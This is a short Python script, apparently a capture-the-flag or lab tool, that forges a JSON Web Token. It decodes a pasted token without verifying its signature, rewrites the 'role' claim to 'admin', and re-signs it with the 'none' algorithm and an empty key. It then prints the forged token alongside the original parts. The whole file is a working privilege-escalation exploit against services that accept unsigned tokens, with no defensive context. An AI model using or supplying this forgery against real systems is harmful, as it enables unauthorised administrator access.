#!/usr/bin/env python3
import jwt

def main():
    jwtToken = input ("Paste JWT Token: ")
    # jwtToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNTk1MzY5OTg1NzQ2LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1OTUzNjk5ODZ9.TdvNwIL01gaDjh55K2ie-mk0oBcrMDxNjKo_ZOEPhbE"

    if jwtToken.startswith( 'token=' ):
        jwtToken = jwtToken.split("=")[1]

    originalheader          = jwtToken.split(".")[0]
    originalpayload         = jwtToken.split(".")[1]
    originaldecodedToken    = jwt.decode(jwtToken, verify=False)
    decodedToken 	        = jwt.decode(jwtToken, verify=False)
    oldrole                 = decodedToken['role']
    decodedToken['role']    = "admin"
    newrole                 = decodedToken['role']
    noneEncoded 	        = jwt.encode(decodedToken, key='', algorithm=None)
    newheader               = noneEncoded.decode().split(".")[0]
    newpayload              = noneEncoded.decode().split(".")[1]

    print("\n"*3)
    print("#" * 20)
    
    print(f'Original Payload Decoded:\n{originaldecodedToken}')
    print(f'\nOriginal Header:\n{originalheader}')
    print(f'\nOriginal Payload:\n{originalpayload}')
    print(f'\nOriginal Role:\n{oldrole}')
    print(f'\nNew Role:\n{newrole}')
    print(f'\nNew Header:\n{newheader}')
    print(f'\nNew Payload:\n{newpayload}')
    print("\nNew Token:\n" + noneEncoded.decode())

    print("#" * 20 + "\n")

if __name__ == '__main__':
    main()